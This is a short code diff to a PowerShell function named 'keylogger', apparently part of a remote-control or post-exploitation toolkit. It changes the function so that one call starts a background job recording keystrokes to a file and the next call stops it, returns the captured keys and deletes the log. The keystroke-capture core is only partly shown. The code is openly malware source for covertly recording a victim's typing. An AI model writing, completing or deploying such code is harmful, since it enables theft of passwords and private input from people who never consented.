@@ -1,5 +1,5 @@
-function keylogger($param){
-    if($param -eq "start")
+function keylogger{
+    if($Global:joblist["keylogger"] -ne "")
     {
         $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
         $word = "\"
@@ -76,12 +76,14 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         $GLOBAL:joblist["keylogger"]= $job
         $GLOBAL:joblist["keylog_path"]= $ruta
     }
-    if($param -eq "stop"){
+    else{
         $job = $Global:joblist["keylogger"]
         Stop-Job -Job $job
         $ruta = $GLOBAL:joblist["keylog_path"]
         $GLOBAL:execute = gc $ruta
         $GLOBAL:execute
         rm $ruta
+        $Global:joblist["keylogger"]= ""
+        $GLOBAL:joblist["keylog_path"]= ""
     }
 }
